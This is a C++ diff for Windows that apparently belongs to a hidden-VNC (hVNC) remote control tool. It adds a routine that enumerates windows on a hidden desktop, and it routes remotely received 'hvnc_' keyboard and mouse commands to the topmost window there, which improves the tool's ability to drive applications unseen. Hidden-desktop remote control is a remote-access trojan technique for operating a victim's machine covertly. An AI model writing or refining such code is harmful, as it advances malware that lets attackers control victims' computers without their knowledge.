@@ -1163,8 +1163,47 @@ static HWND smart_window_from_point(POINT pt) {
     return WindowFromPoint(pt);
 }
 
+static BOOL CALLBACK FindWindowAtPointEnum(HWND hwnd, LPARAM lParam) {
+    struct Param {
+        POINT pt;
+        HWND result;
+    }* p = reinterpret_cast<Param*>(lParam);
+
+    if (IsWindowVisible(hwnd) && !IsIconic(hwnd)) {
+        RECT rect;
+        if (GetWindowRect(hwnd, &rect)) {
+            if (PtInRect(&rect, p->pt)) {
+                wchar_t className[256];
+                if (GetClassNameW(hwnd, className, 256)) {
+                    if (wcscmp(className, L"Progman") != 0 &&
+                        wcscmp(className, L"WorkerW") != 0 &&
+                        wcscmp(className, L"Shell_TrayWnd") != 0) {
+                        p->result = hwnd;
+                        return FALSE; // Found topmost window containing the point, stop enum
+                    }
+                }
+            }
+        }
+    }
+    return TRUE;
+}
+
+static HWND get_topmost_window_at_point(POINT pt) {
+    struct Param {
+        POINT pt;
+        HWND result;
+    } param = { pt, NULL };
+
+    EnumDesktopWindows(g_hHiddenDesktop, FindWindowAtPointEnum, reinterpret_cast<LPARAM>(&param));
+
+    if (param.result) {
+        return param.result;
+    }
+    return smart_window_from_point(pt);
+}
+
 static HWND target_window_from_screen_point(POINT screenPt) {
-    HWND hwnd = smart_window_from_point(screenPt);
+    HWND hwnd = get_topmost_window_at_point(screenPt);
     if (!hwnd || !IsWindow(hwnd)) return NULL;
     return resolve_child_window_from_point(hwnd, screenPt);
 }
@@ -1337,7 +1376,7 @@ static void input_loop() {
         // ---- Klavye ----
         if (action == "hvnc_keydown" || action == "hvnc_keyup" || action == "hvnc_char") {
             int vk = cmd.value("keycode", 0);
-            HWND hTarget = WindowFromPoint(g_lastMousePos);
+            HWND hTarget = get_topmost_window_at_point(g_lastMousePos);
             if (!hTarget || !IsWindow(hTarget)) hTarget = GetFocusedWindow();
             if (!hTarget || !IsWindow(hTarget)) continue;
 
@@ -1445,7 +1484,7 @@ static void input_loop() {
                                  SWP_NOZORDER | SWP_NOACTIVATE);
                 }
             } else {
-                HWND hwnd = smart_window_from_point(screenPt);
+                HWND hwnd = get_topmost_window_at_point(screenPt);
                 if (hwnd) {
                     activate_if_new_window(hwnd);
                     POINT clientPt = screenPt;
@@ -1471,7 +1510,7 @@ static void input_loop() {
             if (btn == 0) g_leftButtonDown = true;
 
             HWND hwnd = target_window_from_screen_point(screenPt);
-            if (!hwnd) hwnd = WindowFromPoint(screenPt);
+            if (!hwnd) hwnd = get_topmost_window_at_point(screenPt);
 
             if (hwnd) {
                 HWND hRoot = GetAncestor(hwnd, GA_ROOT);
@@ -1569,7 +1608,7 @@ static void input_loop() {
 
             HWND hwnd = g_mouseDownTarget[btn];
             if (!hwnd || !IsWindow(hwnd)) hwnd = target_window_from_screen_point(screenPt);
-            if (!hwnd) hwnd = WindowFromPoint(screenPt);
+            if (!hwnd) hwnd = get_topmost_window_at_point(screenPt);
 
             if (hwnd) {
                 HWND hRoot = GetAncestor(hwnd, GA_ROOT);
@@ -1627,7 +1666,7 @@ static void input_loop() {
             if (btn < 0 || btn > 2) btn = 0;
 
             HWND hwnd = target_window_from_screen_point(screenPt);
-            if (!hwnd) hwnd = WindowFromPoint(screenPt);
+            if (!hwnd) hwnd = get_topmost_window_at_point(screenPt);
 
             if (hwnd) {
                 HWND hRoot = GetAncestor(hwnd, GA_ROOT);
